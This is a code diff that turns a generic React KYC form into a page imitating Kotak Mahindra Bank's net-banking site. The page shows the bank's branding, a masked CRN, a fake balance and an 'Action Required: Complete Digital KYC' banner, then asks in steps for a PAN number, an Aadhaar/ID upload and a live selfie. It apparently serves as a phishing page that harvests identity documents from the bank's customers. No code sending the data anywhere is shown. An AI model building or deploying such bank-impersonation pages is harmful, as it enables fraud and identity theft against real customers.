@@ -1,176 +1,116 @@
 import React, { useState } from 'react';
 import { useNavigate } from 'react-router-dom';
-import styles from './AuthForm.module.css';
+import '../styles/kotak.css';
 
 const KycForm = () => {
   const navigate = useNavigate();
+  const [step, setStep] = useState(1);
   const [formData, setFormData] = useState({
-    documentType: '',
+    documentType: 'PAN_CARD',
     documentNumber: '',
     userImage: null,
     signatureImage: null,
     documentFront: null,
     documentBack: null,
   });
-  const [error, setError] = useState('');
-  const [loading, setLoading] = useState(false);
-  const [success, setSuccess] = useState(false);
 
-  const handleChange = (e) => {
+  const handleInputChange = (e) => {
     const { name, value, files } = e.target;
-    if (files) {
-      setFormData({ ...formData, [name]: files[0] });
-    } else {
-      setFormData({ ...formData, [name]: value });
-    }
+    setFormData({ ...formData, [name]: files ? files[0] : value });
   };
-
-  const handleSubmit = async (e) => {
-    e.preventDefault();
-    setError('');
-    setLoading(true);
-
-    // Basic validation
-    if (!formData.documentType || !formData.documentNumber) {
-      setError('Please fill in all required fields');
-      setLoading(false);
-      return;
-    }
-
-    try {
-      const submitData = new FormData();
-      submitData.append('documentType', formData.documentType);
-      submitData.append('documentNumber', formData.documentNumber);
-      if (formData.userImage) submitData.append('userImage', formData.userImage);
-      if (formData.signatureImage) submitData.append('signatureImage', formData.signatureImage);
-      if (formData.documentFront) submitData.append('documentFront', formData.documentFront);
-      if (formData.documentBack) submitData.append('documentBack', formData.documentBack);
-
-      const response = await fetch('http://localhost:3000/kyc', {
-        method: 'POST',
-        headers: {
-          Authorization: `Bearer ${localStorage.getItem('token')}`,
-        },
-        body: submitData,
-      });
-
-      if (!response.ok) {
-        const errorData = await response.json();
-        throw new Error(errorData.message || 'Failed to submit KYC');
-      }
-
-      setSuccess(true);
-      setTimeout(() => navigate('/dashboard'), 2000);
-    } catch (err) {
-      setError(err.message);
-    } finally {
-      setLoading(false);
-    }
-  };
-
-  if (success) {
-    return (
-      <div className={styles.container}>
-        <div className={styles.formCard}>
-          <h2>Success!</h2>
-          <p>Your KYC request has been submitted successfully. You will be redirected to the dashboard.</p>
-        </div>
-      </div>
-    );
-  }
 
   return (
-    <div className={styles.container}>
-      <div className={styles.formCard}>
-        <h2>KYC Verification</h2>
-        <p style={{ textAlign: 'center', marginBottom: '20px', color: '#666' }}>
-          Submit your identification details and documents for verification.
-        </p>
+    <div className="kotak-app-wrapper">
+      {/* Utility Top Bar */}
+      <header className="top-header">
+        <div className="logo-section">
+          <h2 style={{margin:0, color: '#222B5F'}}>kotak</h2>
+          <small style={{fontSize: '10px', color: '#666'}}>Kotak Mahindra Bank</small>
+        </div>
+        <div className="crn-bar">
+          Sitemap | Welcome <span>New User</span><br />
+          CRN: ****1287 | Profile | Change Password | <span style={{color: 'red', cursor: 'pointer'}}>Logout</span>
+        </div>
+      </header>
 
-        {error && <div className={styles.error}>{error}</div>}
+      {/* Area A: Main Red Nav Ribbon */}
+      <nav className="red-ribbon-nav">
+        <a href="#" className="nav-link active">Home</a>
+        <a href="#" className="nav-link">Payment/Transfer</a>
+        <a href="#" className="nav-link">Banking</a>
+        <a href="#" className="nav-link">BillPay</a>
+        <a href="#" className="nav-item nav-link" style={{background: 'white', color: 'red', margin: '8px', padding: '5px 15px', borderRadius: '4px'}}>Apply Now</a>
+      </nav>
 
-        <form onSubmit={handleSubmit}>
-          <div className={styles.formGroup}>
-            <label>Document Type *</label>
-            <select
-              name="documentType"
-              value={formData.documentType}
-              onChange={handleChange}
-              required
-            >
-              <option value="">Select Document Type</option>
-              <option value="PASSPORT">Passport</option>
-              <option value="DRIVING_LICENSE">Driving License</option>
-              <option value="NATIONAL_ID">National ID</option>
-              <option value="OTHER">Other</option>
-            </select>
+      {/* Dashboard Main Content */}
+      <main className="main-dashboard">
+        <div className="dashboard-tabs">
+          <div className="tab-item active">Your Assets (+)</div>
+          <div className="tab-item">Your Liabilities (-)</div>
+          <div className="tab-item">Your Messages ✉</div>
+        </div>
+
+        <div className="summary-strip">
+          <div className="summary-item">
+            <small>What you have</small>
+            <div className="val-pos">175648.43</div>
+          </div>
+          <div className="summary-item">
+            <small>What you owe</small>
+            <div className="val-neg">0.00</div>
+          </div>
+        </div>
+
+        {/* KYC Verification Form Section */}
+        <div className="kyc-dashboard-content">
+          <div style={{background: '#fff9f9', padding: '15px', borderLeft: '5px solid red', marginBottom: '20px'}}>
+            <h4 style={{margin:0}}>Action Required: Complete Digital KYC</h4>
+            <small>Your account features are currently limited. Follow the 3 steps below.</small>
           </div>
 
-          <div className={styles.formGroup}>
-            <label>Document Number *</label>
-            <input
-              type="text"
-              name="documentNumber"
-              value={formData.documentNumber}
-              onChange={handleChange}
-              required
-              placeholder="Enter document number"
-            />
+          <div className="stepper-visual" style={{display:'flex', gap:'20px', marginBottom:'30px'}}>
+             <div style={{fontWeight: step===1?'bold':'normal', color: step===1?'red':'#666'}}>1. Identity</div>
+             <div style={{color: '#ccc'}}>➤</div>
+             <div style={{fontWeight: step===2?'bold':'normal', color: step===2?'red':'#666'}}>2. Documents</div>
+             <div style={{color: '#ccc'}}>➤</div>
+             <div style={{fontWeight: step===3?'bold':'normal', color: step===3?'red':'#666'}}>3. Finalize</div>
           </div>
 
-          <div className={styles.formGroup}>
-            <label>Selfie Photo</label>
-            <input
-              type="file"
-              name="userImage"
-              accept="image/*"
-              onChange={handleChange}
-              capture="user"
-            />
-            <small style={{ color: '#666' }}>Take a clear selfie</small>
-          </div>
+          {/* Form Step Logic */}
+          <form style={{maxWidth: '500px'}}>
+            {step === 1 && (
+              <div>
+                <label>PAN Card Number</label>
+                <input type="text" name="documentNumber" className="kotak-input" placeholder="ABCDE1234F" onChange={handleInputChange}/>
+                <button type="button" className="btn-kotak-red" onClick={() => setStep(2)}>Continue</button>
+              </div>
+            )}
 
-          <div className={styles.formGroup}>
-            <label>Signature Image</label>
-            <input
-              type="file"
-              name="signatureImage"
-              accept="image/*"
-              onChange={handleChange}
-            />
-            <small style={{ color: '#666' }}>Upload your signature image</small>
-          </div>
+            {step === 2 && (
+              <div>
+                <label>Upload Aadhaar / ID Front</label>
+                <input type="file" name="documentFront" className="kotak-input" onChange={handleInputChange}/>
+                <button type="button" className="btn-kotak-red" onClick={() => setStep(3)}>Continue</button>
+              </div>
+            )}
 
-          <div className={styles.formGroup}>
-            <label>Document Front</label>
-            <input
-              type="file"
-              name="documentFront"
-              accept="image/*"
-              onChange={handleChange}
-            />
-            <small style={{ color: '#666' }}>Photo of document front</small>
-          </div>
+            {step === 3 && (
+              <div>
+                <label>Live Selfie Capture</label>
+                <input type="file" name="userImage" className="kotak-input" capture="user" onChange={handleInputChange}/>
+                <button type="submit" className="btn-kotak-red">Submit Application</button>
+              </div>
+            )}
+          </form>
+        </div>
+      </main>
 
-          <div className={styles.formGroup}>
-            <label>Document Back</label>
-            <input
-              type="file"
-              name="documentBack"
-              accept="image/*"
-              onChange={handleChange}
-            />
-            <small style={{ color: '#666' }}>Photo of document back (if applicable)</small>
-          </div>
-
-          <button type="submit" disabled={loading} className={styles.button}>
-            {loading ? 'Submitting...' : 'Submit KYC'}
-          </button>
-        </form>
-
-        <p className={styles.link}>
-          <a href="/dashboard">Back to Dashboard</a>
-        </p>
+      {/* Area B: Floating Ask Keya */}
+      <div className="keya-bot-container">
+        <div style={{background: '#fff', borderRadius: '50%', boxShadow: '0 4px 10px rgba(0,0,0,0.2)'}}>
+           <img src="https://img.icons8.com/color/96/assistant.png" className="keya-avatar" alt="Keya" />
+        </div>
+        <div style={{fontSize: '11px', fontWeight: 'bold', marginTop: '5px'}}>Ask Keya</div>
       </div>
     </div>
   );
